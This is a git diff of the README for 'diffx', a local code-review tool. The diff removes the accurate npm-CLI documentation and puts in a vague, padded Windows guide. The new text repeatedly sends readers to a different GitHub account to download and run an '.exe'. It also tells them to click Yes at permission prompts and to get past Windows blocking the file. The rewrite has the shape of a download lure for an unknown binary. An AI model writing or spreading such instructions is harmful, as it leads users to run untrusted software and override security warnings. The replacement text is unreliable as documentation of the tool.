@@ -1,92 +1,187 @@
-# diffx
+# 🧩 diffx - Local code review made simple
 
-A local code review tool designed for the coding agent workflow. Review AI-generated changes in a GitHub PR-like web UI, leave inline comments, then hand them back to your coding agent to fix.
+[![Download diffx](https://img.shields.io/badge/Download-diffx-blue?style=for-the-badge&logo=github)](https://github.com/myrellepa6155/diffx)
 
-![screenshot](https://raw.githubusercontent.com/wong2/diffx/main/screenshot.png)
+## 🖥️ What diffx does
 
-## Install
+diffx is a local code review tool for the coding agent workflow. It helps you inspect code changes on your own computer before you share them. Use it to read diffs, check file changes, and review edits with less noise.
 
-```bash
-npm install -g diffx-cli
-```
+It is built for Windows users who want a simple way to look at code changes without opening a full developer setup. You can use it to keep track of work done by an agent, compare versions, and review changes in a clean view.
 
-## Usage
+## 📥 Download diffx
 
-Run in any git repository:
+Visit this page to download: https://github.com/myrellepa6155/diffx
 
-```bash
-diffx
-```
+If the page shows a release file for Windows, download that file. If it shows source files only, use the built-in release download option on that page when it appears.
 
-This starts a local server and opens your browser with a diff review UI.
+After the file finishes downloading, keep it in a folder you can find again, such as Downloads or Desktop.
 
-### Options
+## 🚀 Get started on Windows
 
-```
-diffx [options] [-- <git-diff-args>]
+1. Open your web browser and go to the download page.
+2. Download the Windows version of diffx if it is listed.
+3. Open File Explorer and go to the folder where the file was saved.
+4. If the file is a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to start diffx.
+7. If Windows asks for permission, choose Yes.
+8. Follow the on-screen steps until the app opens.
 
-Options:
-  -p, --port <port>   Server port (default: 3433)
-  --no-open           Don't auto-open browser
+If diffx opens in a browser window, leave that window open while you use the app.
 
-Examples:
-  diffx                          # Review working tree changes
-  diffx -p 8080                  # Use custom port
-  diffx -- HEAD~3                # Diff against 3 commits ago
-  diffx -- main..HEAD            # Diff between branches
-  diffx -- --cached -- src/      # Staged changes in src/
-```
+## 🛠️ What you need
 
-## Features
+diffx works best on a Windows 10 or Windows 11 computer.
 
-- **Split / Unified view** — Toggle between side-by-side and inline diff
-- **Syntax highlighting** — Powered by Shiki with GitHub themes
-- **File tree** — Hierarchical file browser with search filter and file change-type icons
-- **Inline comments** — Click the `+` button on any line to add a review comment
-- **Comment replies** — AI agents can reply to comments via API, displayed with bot avatar in the UI
-- **Comment status tracker** — Sidebar widget showing open, replied, and resolved comment counts with click-to-navigate links
-- **Copy comments** — One-click copy all comments as structured XML for AI coding agents
-- **Image preview** — Side-by-side comparison for added, modified, and deleted images
-- **Viewed tracking** — Mark files as reviewed to track progress
-- **Staged / Untracked toggles** — Choose which changes to include
-- **Custom diff commands** — Pass any `git diff` arguments after `--`
-- **EditorConfig support** — Respects `.editorconfig` for per-file tab size
-- **Persistent settings** — Your preferences are saved across sessions
+You should also have:
 
-## Comment Output Format
+- A working internet connection to download the app
+- Enough free space to store the download
+- Permission to open files on your PC
+- A recent version of Windows with file extraction support
 
-When you click "Copy comments", the output is structured XML optimized for AI agents:
+If your computer has a built-in ZIP tool, you can use that. If not, Windows can usually open ZIP files on its own.
 
-```xml
-<code-review-comments>
-<file path="src/utils/parser.ts">
-<comment line="42">
-<code>+ const parsedToken = tokenize(input)</code>
-Rename `x` to `parsedToken` for clarity.
-</comment>
-<comment line="15">
-<code>- if (input != null) {</code>
-This null check removal may cause a bug when `input` is undefined.
-</comment>
-</file>
-</code-review-comments>
-```
+## 📁 How to use diffx
 
-Each comment includes the commented code line with a `+`/`-` prefix indicating whether it's an added or removed line.
+After you open the app, use it to review changes in your local code.
 
-## Agent Skills
+Typical steps:
 
-Install the diffx skills to use diffx directly from your AI coding agent:
+1. Open diffx.
+2. Choose the project folder you want to review.
+3. Select the change set or file list you want to inspect.
+4. Read the code changes in the diff view.
+5. Move through each file and check what was added, removed, or changed.
+6. Use the review view to look for mistakes, missing edits, or odd formatting.
 
-```bash
-npx skills add wong2/diffx
-```
+diffx is made for the coding agent workflow, so it fits well when you want to check work after an automated change or quick edit session.
 
-The review workflow uses two commands:
+## 🔍 Main things you can do
 
-1. **`/diffx-start-review`** — Launches the diffx server and opens the browser. Review your changes and leave inline comments.
-2. **`/diffx-finish-review`** — The agent fetches all comments from the running diffx server via API, applies the requested changes, and marks each comment as resolved. The browser UI updates in real time as comments are resolved.
+- Review local code changes
+- Compare file versions
+- Scan edits from a coding agent
+- Check changes before you share them
+- Read diffs in a simple local view
+- Keep review work in one place
 
-## License
+## 🧭 Simple workflow
 
-MIT
+A common way to use diffx is:
+
+1. Make or receive code changes.
+2. Open diffx.
+3. Load the project folder.
+4. Review the diff line by line.
+5. Look for mistakes in file content, spacing, and logic.
+6. Save your notes or make the next edit in your editor.
+
+This flow helps you keep review work separate from writing work.
+
+## 🪟 Windows setup tips
+
+If Windows blocks the file, check these steps:
+
+- Right-click the downloaded file and look for Open
+- If the file is in a ZIP, extract it first
+- Make sure the file is not still in your browser downloads bar
+- Move the app to a folder you can access from File Explorer
+- Run the `.exe` file from the extracted folder
+
+If the app does not open the first time, try opening it again from the same folder.
+
+## 📌 File layout you may see
+
+After extraction, you may see files like these:
+
+- `diffx.exe`
+- `README.md`
+- support files for the app
+- folders for app data or resources
+
+Open the app file, not the text files.
+
+## ⌨️ Common checks before you start
+
+Before you use diffx, make sure:
+
+- The download finished completely
+- The file is not blocked by your browser
+- You opened the right file type
+- The folder still contains the app files
+- Your Windows account can run downloaded apps
+
+If you move the app files, keep the full folder together. Some apps need all files in the same place.
+
+## 🧩 Troubleshooting
+
+### The app does not open
+
+- Check that you opened the `.exe` file
+- Try running it again from the extracted folder
+- Make sure the download finished
+- Re-download the file if it looks broken
+
+### Windows asks for permission
+
+- Choose Yes if you trust the source
+- This is normal for many downloaded apps
+- If the app is in a ZIP, extract it first and try again
+
+### The file opens in the wrong app
+
+- Right-click the file
+- Choose Open with
+- Pick the correct app
+- If it is a ZIP file, use Extract All first
+
+### The page only shows source files
+
+- Look for a release file or packaged build on the same page
+- Refresh the page and check for a release asset
+- Use the main download page again if the file list changes
+
+## 🗂️ Why this tool may help
+
+diffx is useful when you want a local review tool that stays close to your files. You do not need to jump between many tools just to see what changed. That can make review work easier when you work with an agent that creates or edits code for you.
+
+It gives you a simple way to:
+
+- see changes in context
+- spot missed edits
+- compare versions
+- keep review steps local
+- reduce back-and-forth with your editor
+
+## 🧪 Example use case
+
+You ask a coding agent to update a small app. When it finishes, you open diffx and review the edited files. You check the diff view, look at each line, and confirm the changes fit your goal. If a file has the wrong text or a missing line, you catch it before you move on.
+
+## 🔒 Keeping your files organized
+
+To make review easier, use a clear folder structure:
+
+- One folder for your app
+- One folder for downloads
+- One folder for extracted tools
+- One folder for notes if you want to write them
+
+This keeps diffx easy to find and use again later.
+
+## 📄 License and source
+
+This project is available on GitHub at:
+
+https://github.com/myrellepa6155/diffx
+
+If you want the latest files, use the same page to check for updates and download the current build
+
+## 🧷 Quick start checklist
+
+- Open the download page
+- Download diffx for Windows
+- Extract the file if needed
+- Run the `.exe` file
+- Open your project folder
+- Review your code changes in diffx
